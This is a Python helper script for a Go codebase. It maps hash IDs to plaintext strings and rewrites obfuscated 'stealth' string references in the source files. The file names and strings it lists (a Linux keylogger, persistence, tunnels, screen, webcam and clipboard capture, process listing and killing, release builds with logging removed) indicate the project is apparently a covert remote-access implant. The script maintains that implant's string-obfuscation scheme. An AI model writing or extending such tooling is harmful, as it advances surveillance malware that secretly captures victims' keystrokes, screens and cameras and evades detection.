#!/usr/bin/env python3
"""recover_lost.py - replace __LOST_* placeholder refs in source with real plaintext.

Does NOT need to match the original hash. The bridge only cares about the VALUE.
After running, bash build.sh re-wraps with fresh hashes.
"""
from pathlib import Path

DIR = Path(__file__).resolve().parent

# hash -> plaintext (best inference from context + bridge contract)
MAP = {
    # ── audio_stream_*.go — audio chunk JSON values ────────────────
    '177ae2a150': 'audio/pcm;rate=16000',
    '45a3d055fb': 'audio/pcm',

    # ── diagnostics_*.go ───────────────────────────────────────────
    '455fae0c2f': 'espeak-ng',
    'df32749ed8': 'available',

    # ── keylog_linux.go — Linux input-event-codes (char or name) ───
    'ae95d5fc9d': 'KP*',
    '5f3f52e00d': 'LALT',
    '7ed62da858': 'Space',
    '4ea1d5b784': 'CapsLock',
    '755df2411e': 'KP7',
    'adedd5f09a': 'KP8',
    '335de670a7': 'KP9',
    'd76a4dccda': 'KP-',
    '07f364fd0b': 'KP4',
    '2e95ba19d7': 'KP5',
    '007d21a3c2': 'KP6',
    '2bbb067836': 'KP+',
    '359a722a93': 'KP1',
    '5d13808839': 'KP2',
    '3cbaf78a54': 'KP3',
    'e0b3c88f6c': 'KP0',
    '945f1c6898': 'KP.',
    'e0c2e7f747': 'KPEnter',
    '9236be9b12': 'RightCtrl',
    'a1fb9605ad': 'KP/',

    # ── log_release.go (panic message) ─────────────────────────────
    'ed088af844': 'fatal: unreachable',

    # ── keylog_linux.go — hash-verified digits + windows log ───────
    '1408c80173': '2',   # sha256("2")[:10]  = d4735e3a26
    '5ef82a2424': '3',   # sha256("3")[:10]  = 4e07408562
    'd8cc00281c': '4',   # sha256("4")[:10]  = 4b227777d4
    '09ae0f4820': '5',   # sha256("5")[:10]  = ef2d127de3
    '3f408b9036': '6',   # sha256("6")[:10]  = e7f6c01177
    'e314eb42c6': '7',   # sha256("7")[:10]  = 7902699be4
    'ced0e3e623': '8',   # sha256("8")[:10]  = 2c624232cd
    '100248ee88': '9',   # sha256("9")[:10]  = 19581e27de
    '8c0056a7a9': 'keylog: %v',

    # ── monitor.go — event types + time format ─────────────────────
    '00d858d0bf': '2006-01-02T15:04:05Z07:00',
    '5b12c4eba0': 'monitor: %v',
    '463ac7966f': '%.2f',
    '4b8c9e782b': 'session_start',
    'f64a9f5d8c': 'session_end',
    'ea50270bd5': 'engine_switch',
    '71086366b8': 'ok',

    # ── persist_linux.go (debugLog — DEAD in release) ──────────────
    '46ba53d7a4': 'persist: %s: %v',

    # ── pty_windows.go ─────────────────────────────────────────────
    '933d040767': '/' + chr(92),
    '295d51b2ff': 'pty: %s: %v',

    # ── record_*.go (debugLog — DEAD in release) ───────────────────
    '20e14cae71': 'record: %v -> %s',
    '0fcbefd58a': 'record: saved %s',
    '776402c7fb': 'record: %v',

    # ── screen_stream_unix.go ──────────────────────────────────────
    '41fe4c23ff': 'sable-%d.jpg',
    'aa5972263c': 'sips',
    '6b3ad7d876': 'sips convert: %v: %s',
    '5cab6c8f2c': 'maim',
    '6ef1108213': 'screencapture: %v: %s',

    # ── telemetry_unix.go ──────────────────────────────────────────
    '07fb62f467': 'ps',
    'c4ff500cea': 'aux',
    '93f1a8f260': 'ss',
    'd68b9eb58d': '/tmp/sable-shot.png',
    '9d4f6c2dba': 'screenshot read: %v',

    # ── telemetry_windows.go ───────────────────────────────────────
    '90aea14de9': 'tasklist',
    '1b6c1b1000': '/fo',
    '94e00a715b': 'csv',
    '4ad1a21f26': 'csv',
    'd07ff224a7': 'tasklist: %v',
    '907ce363a3': ',',
    '2c1c71a8f4': '/pid',
    'df3d2b2400': '/f',
    '64cdd81658': 'taskkill',
    'b17575d30c': '-ano',
    '277292878d': 'netstat failed',
    '705df2de63': '-selection',
    '61ebe1a405': 'clipboard read failed',
    '789b072953': 'text=%s',
    '686b766363': 'tts: %s',

    # ── tunnel.go (debugLog — DEAD in release) ─────────────────────
    'f1ef1fccac': '%s tunnel dial failed attempt=%d session=%s: %v',
    'ad32a3bfc4': '%s tunnel established session=%s',
    '12b7496421': '%s tunnel req failed session=%s req=%s: %v',
    '02fa90adc5': '%s tunnel resp failed session=%s req=%s: %v',

    # ── webcam_stream_*.go ─────────────────────────────────────────
    '7ce74701f4': 'mjpeg',
    'da618c10e0': 'image/jpeg',
    'dd15b8a9b0': 'seq',

    # ── webcam_*.go ────────────────────────────────────────────────
    '40d8cda43c': 'sable-cam-%d.jpg',
}

def go_quote(s):
    """Emit a valid Go string literal."""
    bs, bt, dq = chr(92), chr(96), chr(34)
    if (bs in s) or (dq in s) or ('\n' in s) or ('\r' in s) or ('\t' in s):
        esc = s.replace(bs, bs+bs).replace(dq, bs+dq)
        esc = esc.replace('\n', bs+'n').replace('\r', bs+'r').replace('\t', bs+'t')
        return dq + esc + dq
    return dq + s + dq

def main():
    total = 0
    for go in sorted(DIR.glob('*.go')):
        if go.name in ('ast_lit.go', 'recover_lost.py', 'unwrap.py'):
            continue
        src = go.read_text(errors='replace')
        orig = src
        hits = 0
        for h, pt in MAP.items():
            old = 'stealth.D(stealth.EncL_' + h + ')'
            if old in src:
                n = src.count(old)
                src = src.replace(old, go_quote(pt))
                hits += n
        if src != orig:
            go.write_text(src)
            print('  %-30s %d refs' % (go.name, hits))
            total += hits
    print('recover_lost: %d refs replaced' % total)

if __name__ == '__main__':
    main()
